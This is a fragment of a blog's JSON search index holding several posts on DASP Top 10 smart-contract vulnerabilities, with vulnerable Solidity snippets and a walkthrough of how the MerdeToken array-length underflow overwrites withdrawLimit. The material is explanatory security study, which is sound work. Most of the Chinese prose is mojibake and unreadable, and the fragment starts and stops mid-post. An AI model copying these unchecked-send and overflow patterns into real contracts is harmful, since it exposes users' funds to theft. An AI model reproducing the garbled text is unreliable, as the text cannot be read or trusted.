æ´¥è´´ï¼Œè§„å®šå°±æ˜¯è¿™ä¹ˆå¤šã€‚è¿™é‡Œå³å›ç­”äº†ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚ å¯¹äºç¬¬äºŒä¸ªé—®é¢˜å“ªäº›è¡Œä¸ºä¼šå¯¼è‡´å‘é€å¤±è´¥ï¼Œå…¶å®åœ¨wikiä¸­ä¹Ÿæœ‰è¯´æ˜ã€‚ Quote Execution running out of gas An operation trying to take more slots off the stack than are available on the stack, or put more than 1024 items onto the stack Jumping to a bad jump destination An invalid opcode (note: the code of an account is assumed to be followed by an infinite tail of STOP instructions, so the program counter â€œwalking offâ€ the end of the code is not an invalid opcode exception. However, jumping outside the code is an exception, because STOP is not a valid jump destination) The REVERT opcode at 0xfd (starting from Metropolis; pre-Metropolis 0xfd is simply an invalid opcode) å…¶ä¸­gasæº¢å‡ºå’Œè¶…è¿‡è°ƒç”¨æ ˆé™åˆ¶è¿™ä¸¤ç‚¹å¯¼è‡´çš„å‘é€å¤±è´¥å¾ˆå®¹æ˜“è¢«å¿½ç•¥ï¼Œä½†è¿™ä¹Ÿæ°æ°æ˜¯æ¼æ´å‘ç”Ÿçš„åœ°æ–¹ã€‚ ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 Unchecked Low Level Calls æ­£å¦‚DASPä»‹ç»ï¼Œsolidityç‰¹æ€§ä¸­å­˜åœ¨ä¸€äº›ä¸å®‰å…¨çš„å‡½æ•°call()ï¼Œcallcode()(å·²ç»é—å¼ƒ)ï¼Œdelegatecall()å’Œsend()ã€‚è¿™ä¸ªå‡½æ•°åœ¨è¿è¡Œé”™è¯¯æ—¶è¡Œä¸ºå¹¶ä¸å¯é€†ï¼Œä»…ä¼šè¿”å›falseï¼Œä»£ç æµç¨‹ä¹Ÿä¼šç»§ç»­ï¼Œè¿™å°±ä¼šå¸¦æ¥å¾ˆå¤šä¸å¯é¢„æœŸçš„ç»“æœã€‚ å®ä¾‹ä»£ç : function withdraw(uint256 _amount) public { require(balances[msg.sender] \u003e= _amount); balances[msg.sender] -= _amount; etherLeft -= _amount; msg.sender.send(_amount); } msg.senderä¸ºä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œå…¶ä¸­æœªå®šä¹‰fallbackå‡½æ•°ï¼Œæˆ–è€…callstackå·²æ»¡ï¼Œå‡ä¼šå¯¼è‡´sendå¤±è´¥ï¼Œè€Œå‡½æ•°æœªæ£€å‡ºsendè¿”å›å€¼ï¼Œæœ€ç»ˆå¯¼è‡´msg.senderå’ŒetherLeftæ•°é‡å‡å°‘ä¸”çŠ¶æ€ä¸å¯é€†è½¬ï¼Œæœ€åå´æ²¡æœ‰å–å›å‡å°‘çš„é’±ã€‚ ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["åŒºå—é“¾"],"content":"0x03 KotET contract KotETæ˜¯ä¸€ä¸ªæŠ¢çš‡ä½çš„æ¸¸æˆåˆçº¦ï¼Œåˆçº¦ä»£ç è§github æ¸¸æˆè§„åˆ™å’Œæ¼æ´åˆ†æå¯ä»¥çœ‹Post-Mortem Investigationè¿™ç¯‡æ–‡ç« ã€‚ // Claim the throne for the given name by paying the currentClaimFee. function claimThrone(string name) { ... uint compensation = valuePaid - wizardCommission; if (currentMonarch.etherAddress != wizardAddress) { currentMonarch.etherAddress.send(compensation); } else { // When the throne is vacant, the fee accumulates for the wizard. } ... } å…¶ä¸»è¦å°±æ˜¯å› ä¸ºæ²¡æœ‰åˆ¤æ–­sendå‡½æ•°è¿”å›å€¼ï¼Œå¯¼è‡´åœ¨æ¥å—è€…æ˜¯ä¸€ä¸ªåˆçº¦æ—¶ï¼Œæœ‰å¯èƒ½å› ä¸ºgasä¸è¶³è€Œå¯¼è‡´sendå¤±è´¥ï¼ˆä¾‹å¦‚Misté’±åŒ…åˆçº¦å¯¹äºKotETæä¾›çš„gasä¸è¶³ä»¥å¤„ç†æ”¯ä»˜è¡Œä¸ºï¼‰ï¼Œä»è€Œold kingæ²¡æœ‰æ”¶åˆ°è¡¥å¿ï¼Œnew kingæ²¡æœ‰æ¶ˆè€—èµ„é‡‘å˜äº‰å¤ºäº†ç‹ä½ã€‚ ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["åŒºå—é“¾"],"content":"0x04 lotto contract issues contract source code exp function cash(uint roundIndex, uint subpotIndex){ ... var winner = calculateWinner(roundIndex,subpotIndex); var subpot = getSubpot(roundIndex); winner.send(subpot); rounds[roundIndex].isCashed[subpotIndex] = true; //Mark the round as cashed } è¿™é‡Œåˆçº¦çš„æ¼æ´æ¯”è¾ƒç®€å•ï¼Œè¿˜æ˜¯sendæ²¡æœ‰åˆ¤æ–­è¿”å›å€¼ï¼Œå¯¼è‡´åœ¨callstackè¶…è¿‡1024æ—¶sendå¤±è´¥ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œã€‚ ä½†æ˜¯å¯ä»¥å­¦ä¹ å¦‚ä½•ç”¨pyethereumå†™expã€‚ Warning amilleræ‰€ç”¨çš„pyethereumä¸ç°åœ¨çš„ç‰ˆæœ¬å·²æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œéœ€è¦é‡æ–°ä¼˜åŒ–expä»£ç ã€‚ ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:5:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["åŒºå—é“¾"],"content":"0x05 Others å…¶ä»–åˆçº¦ä¹Ÿå­˜åœ¨ç±»ä¼¼é—®é¢˜ï¼Œä¾‹å¦‚BTCåˆçº¦ï¼š Report: Security Audit of BTC Relay implementation [diff] Scanning Live Ethereum Contracts for the â€œUnchecked-Sendâ€ Bugä¸€æ–‡ä¸­ä¹Ÿè¯¦ç»†æè¿°äº†æ­¤ç±»é—®é¢˜çš„å¹¶æä¾›äº†ä¿®å¤å’Œæ‰«æå·¥å…·åŸç†â€“Appendix A: Details on how we analyze the blockchainã€‚ åˆ©ç”¨sandå‡½æ•°åœ¨è™šæ‹Ÿæœºå­—èŠ‚ç ä¸­è¿ç»­POPæ•°é‡æ¥åˆ¤æ–­æ˜¯å¦åšè¿”å›å€¼å¤„ç†ã€‚ ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:6:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info Arithmetic Issuesä¸ºDASP TOP10çš„ç¬¬ä¸‰ç±»æ¼æ´ã€‚è¿™ç±»ç®—æ•°æ¼æ´æ¯”è¾ƒå¸¸è§ also known as integer overflow and integer underflow ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 åŸç† æ•´å‹æº¢å‡ºçš„åŸç†å¾ˆç®€å•ï¼Œä»¥8ä½æ•´å‹ä¸ºä¾‹ï¼Œå€Ÿå›¾è¯´æ˜ä¸Šæº¢ã€‚ 8ä½æ— ç¬¦å·æ•´å‹èŒƒå›´[0, 255]: 8ä½æœ‰ç¬¦å·æ•´å‹èŒƒå›´[-128, 127]: å¯¹äºä¸‹æº¢ (unit8)0-1=(uint8)255, (int8)(-128)-1=(int8)127. ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 åœºæ™¯ å¯¹äºæ™ºèƒ½åˆçº¦å¸¸è§çš„æ•´å‹æº¢å‡ºæ¼æ´ï¼Œä¼šå‡ºç°åœ¨å¦‚ä¸‹åœºæ™¯ï¼š ç»å…¸åœºæ™¯ï¼Œæ²¡æœ‰æ£€æŸ¥ä¸‹æº¢ function withdraw(uint _amount) { require(balances[msg.sender] - _amount \u003e 0); // å¦‚æœ _amount \u003e msg.sender, underflow msg.sender.transfer(_amount); // ä¼štransferä¸€ä¸ªå¾ˆå¤§çš„å€¼ balances[msg.sender] -= _amount; } off-by-one function popArrayOfThings() { require(arrayOfThings.length \u003e= 0); arrayOfThings.length--; // lengthæ˜¯uintï¼Œå½“length=0ï¼Œlength--ä¼šä¸‹æº¢ç¿»è½¬ï¼›åŒæ ·++ä¹Ÿéœ€è¦æ³¨æ„ } å…³é”®å­—var varä¼šæ ¹æ®åˆ†é…å€¼æ›´æ”¹ä¸ºæœ€å°é€‚é…ç±»å‹ï¼Œä¸‹ä¾‹ä¸­i=0ï¼Œå› æ­¤iè¢«åˆ†é…ä¸ºuint8ã€‚å› æ­¤iæœ€å¤§255ï¼Œå½“somethingLarge\u003e256æ—¶ï¼Œiå°±ä¼šä¸Šæº¢ã€‚ for (var i = 0; i \u003c somethingLarge; i ++) { // ... } ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["åŒºå—é“¾"],"content":"0x03 å®ä¾‹ ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["åŒºå—é“¾"],"content":"ä¸Šæº¢æ¼æ´ Hexagon åˆ†æï¼šä»£å¸å˜æ³¡æ²«ï¼Œä»¥å¤ªåŠHexagonæº¢å‡ºæ¼æ´æ¯”ç‹—åº„è¿˜è¿‡åˆ† Code: Source Code æ¼æ´å‡½æ•°ï¼š function _transfer(address _from, address _to, uint _value) internal { /* Prevent transfer to 0x0 address. Use burn() instead */ require (_to != 0x0); /* Check if the sender has enough */ require (balanceOf[_from] \u003e= _value + burnPerTransaction); // Boom! /* Check for overflows */ require (balanceOf[_to] + _value \u003e balanceOf[_to]); /* Subtract from the sender */ balanceOf[_from] -= _value + burnPerTransaction; /* Add the same to the recipient */ balanceOf[_to] += _value; /* Apply transaction fee */ balanceOf[0x0] += burnPerTransaction; /* Update current supply */ currentSupply -= burnPerTransaction; /* Notify network */ Burn(_from, burnPerTransaction); /* Notify network */ Transfer(_from, _to, _value); } å…¸å‹çš„æ•´å‹ä¸Šæº¢æ¼æ´ã€‚ é€šè¿‡remixå¯ä»¥å¤ç°æ¼æ´ï¼š SMT åˆ†æï¼š Solidityåˆçº¦ä¸­çš„æ•´æ•°å®‰å…¨é—®é¢˜â€”â€”SMT/BECåˆçº¦æ•´æ•°æº¢å‡ºè§£æ New proxyOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10376) Code: Source Code æ¼æ´å‡½æ•°ï¼š function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt, uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){ if(balances[_from] \u003c _feeSmt + _value) revert(); // Boom! uint256 nonce = nonces[_from]; bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); if(_from != ecrecover(h,_v,_r,_s)) revert(); if(balances[_to] + _value \u003c balances[_to] || balances[msg.sender] + _feeSmt \u003c balances[msg.sender]) revert(); balances[_to] += _value; Transfer(_from, _to, _value); balances[msg.sender] += _feeSmt; Transfer(_from, msg.sender, _feeSmt); balances[_from] -= _value + _feeSmt; nonces[_from] = nonce + 1; return true; } é€šè¿‡remixå¯ä»¥å¤ç°æ¼æ´ï¼š BEC åˆ†æï¼š ALERT: New batchOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10299) Code: Source Code æ¼æ´å‡½æ•°ï¼š function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) { uint cnt = _receivers.length; uint256 amount = uint256(cnt) * _value; // Boom! require(cnt \u003e 0 \u0026\u0026 cnt \u003c= 20); require(_value \u003e 0 \u0026\u0026 balances[msg.sender] \u003e= amount); balances[msg.sender] = balances[msg.sender].sub(amount); for (uint i = 0; i \u003c cnt; i++) { balances[_receivers[i]] = balances[_receivers[i]].add(_value); Transfer(msg.sender, _receivers[i], _value); } return true; } é€šè¿‡remixå¯ä»¥å¤ç°æ¼æ´ï¼š ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:4:1","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["åŒºå—é“¾"],"content":"ä¸‹æº¢æ¼æ´ MerdeToken ä»¥ä¸Šçš„æ¼æ´éƒ½å¾ˆç®€å•ï¼Œç®€å•åˆ†ææ—¢èƒ½æ‰¾åˆ°Bugï¼Œè€Œè¿™ä¸ªæ¼æ´å°±å¾ˆæœ‰æ„æ€äº†ï¼Œä¸€åº¦è¢«æ€€ç–‘æ˜¯åé—¨ã€‚ åˆ†æï¼š MerdeToken: Itâ€™s Some Hot Shit Code: Source Code MDTå°±æ˜¯ä¸€ä¸ªtoken contractï¼Œä½ å¯ä»¥é€šè¿‡è¯¥åˆçº¦è®¾ç½®ä¿¡ä»»ç¬¬ä¸‰æ–¹åŠå–å¸é¢åº¦ï¼Œè¿˜æœ‰å¸¸è§„çš„å­˜å¸ï¼Œäº¤æ˜“å’Œå–å¸æ“ä½œã€‚ä½†è¯¥åˆçº¦é¢å¤–æä¾›äº†å¹¶ä¸éœ€è¦çš„å¥–é‡‘ä»£ç æ“ä½œï¼Œè€Œæ­¤åŠŸèƒ½å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä»»æ„ä¿®æ”¹å–å¸é¢åº¦é™åˆ¶ï¼Œå› æ­¤è¢«æ€€ç–‘æ˜¯åé—¨ã€‚ æ¼æ´å…¶å®å¾ˆç®€å•ï¼ŒbonusCodes.lengthå¦‚æœç­‰äº0ï¼ŒbonusCodes.lengthâ€“ä¼šé€ æˆä¸‹æº¢ç¿»è½¬å˜ä¸º 2**256-1ã€‚ function popBonusCode() onlyOwner { require(bonusCodes.length \u003e= 0); bonusCodes.length--; // Boom! } æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¾ˆæœ‰è¶£ï¼Œæœ‰ç‚¹åƒäºŒè¿›åˆ¶ä¸­çš„æ ˆæº¢å‡ºå’Œä»»æ„å†…å­˜å†™ï¼Œè¿™é‡Œç€é‡è®²è§£ã€‚ é¦–å…ˆä½ éœ€è¦ç†è§£Solidityä¸­çš„çŠ¶æ€å˜é‡å­˜å‚¨æ¨¡å‹ï¼ˆLayout of State Variables in Storageï¼‰ã€‚ ç†è§£æ¨¡å‹æœ‰å‡ ä¸ªå…³é”®ç‚¹ï¼š åˆçº¦çš„å­˜å‚¨ç”±ä¸€ä¸ª256ä½æŒ‡é’ˆå¤„ç†ï¼Œè€Œåˆçº¦å†…çš„å˜é‡éƒ½å­˜å‚¨åœ¨ä»¥åˆçº¦æŒ‡é’ˆä¸ºåŸºå€çš„åç§»åœ°å€ä¸­ã€‚ å¤§å°å›ºå®šçš„å˜é‡ï¼ˆé™¤äº†mappingï¼Œå˜é•¿æ•°ç»„ä»¥å¤–çš„æ‰€æœ‰ç±»å‹ï¼‰åœ¨å­˜å‚¨ä¸­æ˜¯ä¾æ¬¡è¿ç»­ä»ä½ç½®0å¼€å§‹æ’åˆ—åœ¨ä¸€ä¸ªä¸ª32å­—èŠ‚æ§½ä¸­ã€‚ å¦‚æœå¤šä¸ªå˜é‡å ç”¨çš„å¤§å°å°‘äº32å­—èŠ‚ï¼Œä¼šå°½å¯èƒ½çš„æ‰“åŒ…åˆ°å•ä¸ªæ§½ä½é‡Œã€‚ ç”±äºmappingå’Œå˜é•¿æ•°ç»„çš„å¤§å°ä¸å¯é¢„çŸ¥ï¼Œå› æ­¤å®šä¹‰ä½¿ç”¨keccak256å“ˆå¸Œæ¥è®¡ç®—æ•°æ®å­˜å‚¨ä½ç½®ã€‚ å¯¹äºmappingï¼Œä¼šåœ¨mappingå®šä¹‰ä½ç½®ï¼ˆpï¼‰å ç”¨ä¸€ä¸ªæ§½ä½ï¼Œä½†å…¶ä¸­æ— æ•°æ®ï¼Œè€Œæ•°æ®å­˜å‚¨ä½ç½®é€šè¿‡ keccak256(k . p)è®¡ç®—å¾—åˆ°ï¼Œkä¸ºmappingé”®ã€‚ å¯¹äºåŠ¨æ€æ•°ç»„ï¼Œä¼šåœ¨æ•°ç»„å®šä¹‰ä½ç½®ï¼ˆpï¼‰å ç”¨ä¸€ä¸ªæ§½ä½ï¼Œå­˜å‚¨æ•°ç»„å…ƒç´ ä¸ªæ•°ï¼Œè€Œæ•°æ®å­˜å‚¨ä½ç½®é€šè¿‡ keccak256(p)è®¡ç®—å¾—åˆ°ã€‚ å…¶ä¸­ç¬¬å››ç‚¹æ¯”è¾ƒéš¾ç†è§£ï¼Œæˆ‘ä»¬é€šè¿‡è¯¥MerdeTokenåˆçº¦è¯´æ˜ã€‚ åœ¨MerdeTokenä¸­å®šä¹‰äº†å¦‚ä¸‹çŠ¶æ€å˜é‡ï¼š address public owner; address public trustedThirdParty; mapping (address =\u003e uint) public balanceOf; uint public deposited; uint public withdrawLimit; uint[] public bonusCodes; åœ¨storageä¸­ä»ä½ç½®0ä¾æ¬¡æ’åˆ— \"storage\": { 0x00 : (address)owner, 0x01 : (address)trustedThirdParty, 0x02 : (mapping)balanceOf, 0x03 : (uint)deposited, 0x04 : (uint)withdrawLimit, 0x05 : (uint[])bonusCodes } å…¶ä¸­balanceOfä¸ºmappingæ˜ å°„ï¼Œè€Œä½ç½®ä¸º0x02ï¼Œå› æ­¤åœ¨0x02ä½ç½®ä¸ºç©ºå€¼ï¼Œè€ŒbalanceOfä¸­kå¯¹åº”çš„valueåœ¨storageä¸­çš„å­˜å‚¨ä½ç½®è®¡ç®—æ–¹å¼ä¸ºkeccak256(k . 0x02)ã€‚ bonusCodesä¸ºåŠ¨æ€æ•°ç»„ï¼Œä½ç½®ä¸º0x05ï¼Œæ•…åœ¨0x05ä¸­å­˜å‚¨æ•°ç»„é•¿åº¦ï¼ˆæ•°ç»„æœ‰å€¼åï¼‰ï¼Œè€ŒbonusCodesæ•°ç»„èµ·å§‹ä½ç½®åœ¨storageä¸­è®¡ç®—æ–¹å¼ä¸ºkeccak256(0x05)ã€‚ Okï¼Œç†è§£äº†ä»¥ä¸Šï¼Œæ¥ä¸‹æ¥å°±è¯´ä¸‹å¦‚ä½•é€šè¿‡bonusCodesæ•´å‹ä¸‹æº¢æ¥ä¿®æ”¹withdrawLimitå€¼ï¼Œè¿™æ˜¯å¦ä¸€ä¸ªéš¾ç‚¹ã€‚ storageæœ‰256ä½çš„åœ°å€ç©ºé—´ï¼ŒçŠ¶æ€å˜é‡ä»åœ°å€0ä¾æ¬¡æ’åˆ—ï¼Œè€Œé€šè¿‡ bonusCodes.length-- æº¢å‡ºä½¿å¾—bonusCodesæ•°ç»„é•¿åº¦å˜ä¸º2**256-1ï¼Œè¦†ç›–äº†å‡ ä¹æ‰€æœ‰storageåœ°å€ç©ºé—´ã€‚å› æ­¤withdrawLimitå˜é‡ä¹Ÿåœ¨bonusCodesæ•°ç»„ä¸­ï¼Œéœ€è¦è®¡ç®—æ‰¾åˆ°withdrawLimitå¯¹åº”çš„æ•°ç»„ä¸‹æ ‡ã€‚ è®¡ç®—æ–¹å¼ï¼šConverting Array Indices to Addresses ç”»ä¸ªå›¾å¸®ä½ ç†è§£ï¼š storage + --------------------------- + -- 0x00 | owner | | | \u003c- index: 2**256-keccak256(0x05) + --------------------------- + | | 0x01 | trustedThirdParty | | | + --------------------------- + | | 0x02 | balanceOf(None) | | | + --------------------------- + | | 0x03 | deposited | v | + --------------------------- + | | 0x04 | withdrawLimit | | | \u003c- index: 2**256-keccak256(0x05)+4 + --------------------------- + | | 0x05 --| bonusCodes.length | | | | + --------------------------- + | | | | | | | | + --------------------------- + | ^ | | ... | | | | + --------------------------- + V | | | | | | + --------------------------- + -\u003e- | keccak256(0x05) -\u003e| address(bonusCodes) | | | \u003c- index: 0 + --------------------------- + | | | | | | + --------------------------- + v | | ... | | | + --------------------------- + | | 2**256-1 | | -- + --------------------------- + æœ€åå°±æ˜¯é€šè¿‡åˆçº¦æä¾›çš„modifyBonusCodeå‡½æ•°ä¿®æ”¹withdrawLimitå€¼æ¥çªç ´å–å¸é¢åº¦çš„é™åˆ¶ã€‚ ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:4:2","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info æœ¬ç¯‡ä¸ºDASP TOP10çš„ç¬¬äºŒç±»æ¼æ´Access Controlã€‚é€šè¿‡ParityåŠRubixiåˆçº¦åˆ†æç†è§£æ­¤ç±»å‹æ¼æ´ï¼Œæ”¹å†™OpenZeppelinä¸­é¢˜ç›®è¾…åŠ©ç†è§£ã€‚ ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 Access Control æ¦‚å¿µï¼šæ”»å‡»è€…é€šè¿‡åˆçº¦ä¸å®‰å…¨çš„å¯è§æ€§è®¾ç½®æ—¶å¯ä»¥ç›´æ¥è®¿é—®åˆçº¦çš„ç§æœ‰å˜é‡å’Œå‡½æ•°ï¼Œè¿™å…¶ä¸­éœ€è¦å¯èƒ½éœ€è¦ç»•è¿‡ä¸€äº›è®¿é—®æ§åˆ¶ã€‚ åœ¨ä½¿ç”¨ Solidity ç¼–å†™åˆçº¦ä»£ç æ—¶ï¼Œæœ‰å‡ ç§é»˜è®¤çš„å˜é‡æˆ–å‡½æ•°è®¿é—®åŸŸå…³é”®å­—ï¼šprivate, public, external å’Œ internalï¼Œå¯¹åˆçº¦å®ä¾‹æ–¹æ³•æ¥è®²ï¼Œé»˜è®¤å¯è§çŠ¶æ€ä¸º publicï¼Œè€Œåˆçº¦å®ä¾‹å˜é‡çš„é»˜è®¤å¯è§çŠ¶æ€ä¸º privateã€‚ å…·ä½“è®²è§£å‚è§solidity develop visibility è¿™é‡Œéœ€è¦é‡ç‚¹å…³æ³¨ä¸‹externalå’Œinternalï¼Œexternalå‡½æ•°ä¸ºåˆçº¦æ¥å£ï¼Œåªèƒ½è¢«å…¶ä»–åˆçº¦è°ƒç”¨ï¼ˆåœ¨è‡ªèº«éœ€é€šè¿‡this.f()è°ƒç”¨ï¼‰ã€‚è€Œinternalå‡½æ•°åªèƒ½è¢«è‡ªèº«è°ƒç”¨ã€‚ æ­¤ç±»æ¼æ´ç»å¸¸ä¼šå‘ç”Ÿåœ¨ä»¥ä¸‹åœºæ™¯ï¼š åˆçº¦ä½¿ç”¨å·²ç»é—å¼ƒçš„tx.originéªŒè¯è°ƒç”¨è€… é€šè¿‡å¾ˆé•¿çš„requireå¤„ç†å¤§é‡çš„è®¤è¯é€»è¾‘ é€šè¿‡delegatecallè°ƒç”¨ä»£ç†åº“æˆ–è€…ä»£ç†åˆçº¦ é€šä¿—è®²å°±æ˜¯ä¸€èˆ¬çš„æ™ºèƒ½åˆçº¦ä¼šé€šè¿‡åˆå§‹åŒ–æŒ‡å®šåˆçº¦çš„æ‹¥æœ‰è€…ï¼Œæ¥å®ç°ç±»ä¼¼èµ‹äºˆç‰¹æƒåæ”¶å›åˆçº¦èµ„é‡‘çš„åŠŸèƒ½ã€‚è€Œåˆå§‹åŒ–å‡½æ•°å¦‚æœèƒ½è¢«ä»»ä½•äººè°ƒç”¨çš„è¯ï¼Œæ”»å‡»è€…å°±ä¼šå°†è‡ªå·±æˆä¸ºåˆçº¦æ‹¥æœ‰è€…è¿›è¡Œæå¸æˆ–æ¶æ„æ“ä½œã€‚ è¿™é‡Œæœ€è‘—åçš„æ¼æ´å°±æ˜¯Parity Wallet Hackã€‚ä½†åœ¨ä»‹ç»è¯¥æ¼æ´å‰éœ€è¦ç†è§£ä¸€äº›solidityçŸ¥è¯†ã€‚ ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 tx.origin Solidity: Tx Origin Attacks åœ¨solidityå®˜æ–¹æ–‡æ¡£ä¸­å·²ç»å£°æ˜ç¦æ­¢ä½¿ç”¨tx.originåšè®¤è¯ã€‚ Quote If your wallet had checked msg.sender for authorization, it would get the address of the attack wallet, instead of the owner address. But by checking tx.origin, it gets the original address that kicked off the transaction, which is still the owner address. The attack wallet instantly drains all your funds. åœ¨solidityä¸­è·å–åˆçº¦è°ƒç”¨æ–¹åœ°å€æœ‰tx.originå’Œmsg.senderä¸¤ç§æ–¹å¼ï¼Œä½†msg.senderä»£è¡¨ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ï¼Œè€Œtx.originä»£è¡¨æºè°ƒç”¨åœ°å€ã€‚ ä¸¾ä¾‹ï¼š ç”¨æˆ·Aé€šè¿‡åˆçº¦Bè°ƒç”¨åˆçº¦C å¯¹äºåˆçº¦Bï¼Œtx.originå’Œmsg.senderå‡ä¸ºA å¯¹äºåˆçº¦Cï¼Œtx.originä¸ºAï¼Œmsg.senderä¸ºB ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x03 call \u0026 delegatecall å‘åˆçº¦å‘é€æ¶ˆæ¯æœ‰ä¸¤ç§åº•å±‚è°ƒç”¨çš„æ¥å£ï¼Œä¸€ä¸ªæ˜¯callï¼Œä¸€ä¸ªæ˜¯delegatecallã€‚ callçš„åŸå‹ä¸ºï¼š \u003caddress\u003e.call.value(...)(...) returns (bool) delegatecallåŸå‹ä¸ºï¼š \u003caddress\u003e.delegatecall(...) returns (bool) å…·ä½“çš„ä½¿ç”¨å¯ä»¥çœ‹callç›¸å…³å‡½æ•° è¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦ç‰¹åˆ«å¼ºè°ƒ äºŒè€…çš„å¼‚åŒï¼š ç›¸åŒ ä¸åŒ 1. è°ƒç”¨æ—¶ä¼ é€’åˆçº¦æ‰€æœ‰gas 1. callå¯ä»¥ä½¿ç”¨.valueä¼ ETH 2. æ‰§è¡Œå¤±è´¥è¿”å›fasle 2. callçš„å¤–éƒ¨è°ƒç”¨ä¸Šä¸‹æ–‡æ˜¯å¤–éƒ¨åˆçº¦ï¼Œè€Œdelegatecallçš„å¤–éƒ¨è°ƒç”¨ä¸Šä¸‹æ–‡æ˜¯è‡ªèº« è¿™é‡Œå€Ÿå›¾è¯´è¯ï¼š å®ä¾‹ï¼ˆå¯åœ¨remixæ“ä½œï¼‰ï¼š contract A { event callMeMaybeEvent(address _from); function callMeMaybe() payable public { callMeMaybeEvent(this); } } contract B { function callTheOtherContract(address _contractAddress) public { require(_contractAddress.call(bytes4(keccak256(\"callMeMaybe()\")))); require(_contractAddress.delegatecall(bytes4(keccak256(\"callMeMaybe()\")))); SomeLib.calledSomeLibFun(); } } library SomeLib { event calledSomeLib(address _from); function calledSomeLibFun() public { calledSomeLib(this); } } å‘å¦ä¸€ä¸ªåˆçº¦å‘é€æ•°æ®æ—¶ï¼Œæ‰¾ä¸åˆ°å¯¹åº”çš„æ–¹æ³•ç­¾åï¼Œä¼šé»˜è®¤è°ƒç”¨fallback()å‡½æ•°ã€‚è€Œsolidityä¸­çš„ä»£ç†åº“å’Œä»£ç†åˆçº¦æ­£æ˜¯ä¾æ®æ­¤ç‰¹æ€§ã€‚å…·ä½“å¯ä»¥çœ‹çœ‹Proxy Libraries in Solidityã€‚Parityæ­£æ˜¯ä¾ç…§ä»£ç†åº“æ¨¡å¼å¼€å‘ï¼Œè¯¥æ¨¡å¼å¯ä»¥è§£å†³å¤§é‡ä»£ç çš„é‡å¤éƒ¨ç½²é—®é¢˜ï¼ŒåŒæ—¶èƒ½å¤Ÿå‡å°‘é‡å¤éƒ¨ç½²äº§ç”Ÿçš„gasæ¶ˆè€—ï¼Œæœ€é‡è¦å¯ä»¥å®ç°æ›´æ–°åªéœ€æ›´æ–°åº“è€Œä¸ç”¨é‡æ–°æ›´æ–°éƒ¨ç½²æ¯ä¸ªé¡¹ç›®ã€‚ æœ‰äº†ä¸Šè¿°çš„çŸ¥è¯†å‚¨å¤‡åè¿›å…¥æ­£é¢˜ï¼Œç°å®åˆçº¦ä¸­çš„è®¿é—®æ§åˆ¶æ¼æ´ã€‚ ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["åŒºå—é“¾"],"content":"0x04 Parity 